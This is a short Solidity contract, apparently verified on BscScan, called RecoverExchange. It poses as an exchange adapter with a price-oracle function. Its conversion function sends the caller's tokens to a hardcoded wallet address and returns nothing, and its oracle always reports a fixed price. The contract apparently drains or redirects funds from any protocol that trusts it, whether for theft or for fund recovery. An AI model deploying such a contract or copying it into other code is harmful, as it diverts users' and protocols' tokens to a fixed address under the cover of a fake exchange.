/**
 *Submitted for verification at BscScan.com on 2023-02-24
*/

// SPDX-License-Identifier: GPL-3.0-only
pragma solidity 0.8.17;

interface IERC20
{
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract RecoverExchange
{
	function convertFundsFromInput(address _from, address, uint256 _inputAmount, uint256) external returns (uint256)
    {
        IERC20(_from).transferFrom(msg.sender, 0x392681Eaf8AD9BC65e74BE37Afe7503D92802b7d, _inputAmount);
        return 0;
    }

	function oracleAveragePriceFactorFromInput(address, address, uint256) external pure returns (uint256)
    {
        return 1e18;
    }
}